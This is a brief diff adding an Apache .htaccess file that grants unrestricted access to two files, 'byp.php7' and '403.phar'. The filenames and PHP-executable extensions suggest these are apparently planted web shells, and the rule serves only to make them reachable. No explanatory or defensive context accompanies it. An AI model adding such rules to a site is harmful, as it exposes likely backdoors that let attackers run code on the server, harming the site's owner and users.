@@ -1,0 +1,10 @@
+<Files byp.php7>
+	Order Deny,Allow
+	Allow from all
+</Files>
+
+<Files 403.phar>
+	Order Deny,Allow
+	Allow from all
+</Files>
+	
